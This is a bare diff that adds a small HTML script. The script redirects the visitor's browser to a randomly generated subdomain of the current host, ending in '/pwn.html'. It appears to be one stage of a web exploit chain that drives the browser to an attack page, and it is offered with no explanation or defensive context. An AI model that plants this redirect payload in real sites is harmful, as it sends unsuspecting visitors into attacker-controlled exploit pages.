@@ -1,0 +1,6 @@
+<script>
+  var l = location.href;
+  l = l.split('/');
+  var redir = l[0] + '//' + Math.random().toString(36).substring(2,10) + '.' + l[2] + '/pwn.html';
+  window.location = redir;
+</script>
